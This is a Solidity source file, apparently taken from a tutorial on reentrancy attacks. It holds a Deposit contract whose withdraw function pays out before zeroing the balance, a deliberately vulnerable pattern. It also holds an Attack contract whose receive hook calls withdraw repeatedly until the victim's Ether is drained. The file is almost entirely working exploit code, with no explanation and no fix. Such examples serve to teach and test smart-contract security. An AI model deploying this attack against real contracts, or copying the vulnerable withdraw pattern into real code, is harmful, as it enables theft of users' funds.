// From: https://hackernoon.com/hack-solidity-reentrancy-attack

pragma solidity ^0.8.16;

contract Deposit {
  mapping(address => uint) public balances;

  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }

  function withdraw() public {
    uint balance = balances[msg.sender];
    require(balance > 0);

    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Failed to send Ether");

    balances[msg.sender] = 0;
  }
}

contract Attack {
  Deposit public deposit;

  constructor(address _depositAddress) {
    deposit = Deposit(_depositAddress);
  }

  // This function is called when Deposit sends Ether to this contract.
  receive() external payable {
    if (address(deposit).balance >= 1 ether) {
      deposit.withdraw();
    }
  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    deposit.deposit{value: 1 ether}();
    deposit.withdraw();
  }
}
